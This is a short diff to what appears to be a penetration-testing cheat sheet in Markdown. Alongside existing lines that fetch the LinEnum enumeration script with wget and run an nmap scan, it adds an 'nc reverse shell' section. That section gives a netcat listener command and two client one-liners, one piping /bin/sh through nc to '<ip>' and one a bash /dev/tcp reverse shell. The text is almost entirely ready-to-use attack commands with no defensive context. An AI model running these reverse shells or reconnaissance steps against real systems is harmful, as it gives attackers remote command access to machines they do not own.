@@ -12,6 +12,18 @@ To fetch from the remote machine
 wget http://<ip>:8000/LinEnum.sh
 ```
 
+
+### nc reverse shell
+Listener
+```
+nc -nlvp 444
+```
+Client
+```
+/bin/sh | nc <ip> 444
+# or
+bash -c "bash -i >& /dev/tcp/127.0.0.1/444 0>&1"
+```
 ### nmap
 ```shell
 nmap -sC -A -T4 <ip>
